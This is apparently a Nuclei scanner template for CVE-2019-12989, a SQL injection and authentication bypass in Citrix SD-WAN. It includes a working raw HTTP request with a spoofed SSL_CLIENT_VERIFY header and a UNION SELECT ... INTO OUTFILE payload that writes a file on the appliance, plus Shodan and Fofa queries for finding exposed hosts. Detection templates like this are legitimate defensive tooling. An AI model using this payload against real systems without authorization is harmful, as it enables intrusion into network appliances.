id: CVE-2019-12989

info:
  name: Citrix SD-WAN SQL Injection - Authentication Bypass
  author: intelligent-ears
  severity: critical
  description: |
    Citrix SD-WAN 10.2.x before 10.2.3 and NetScaler SD-WAN 10.0.x before 10.0.8 contain a SQL injection vulnerability
    in the getpackagefile.cgi script that allows unauthenticated attackers to bypass authentication and write files.
  reference:
    - https://www.tenable.com/security/research/tra-2019-32
    - https://support.citrix.com/article/CTX251987
    - https://nvd.nist.gov/vuln/detail/CVE-2019-12989
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2019-12989
    cwe-id: CWE-89
  metadata:
    vendor: citrix
    product: netscaler_sd-wan
    shodan-query: http.title:"Citrix SD-WAN"
    fofa-query: title="citrix sd-wan"
  tags: cve,cve2019,citrix,sqli,sdwan,auth-bypass

http:
  - raw:
      - |
        POST /sdwan/nitro/v1/config/get_package_file?action=file_download HTTP/1.1
        Host: {{Hostname}}
        SSL_CLIENT_VERIFY: SUCCESS
        Content-Type: application/json

        {"get_package_file": {"site_name": "blah' union select 'tenable','zero','day','research' INTO OUTFILE '/tmp/token_01234';#\"","appliance_type": "primary","package_type": "active"}}

    matchers-condition: or
    matchers:
      - type: status
        status:
          - 400

      - type: word
        words:
          - "Invalid value specified for site_name or appliance_type"
        part: body

      - type: word
        words:
          - "blah' union select 'tenable','zero','day','research' INTO OUTFILE '/tmp/token_01234';#\""
        part: body

    extractors:
      - type: regex
        name: vulnerable
        regex:
          - "Citrix SD-WAN"
        part: body
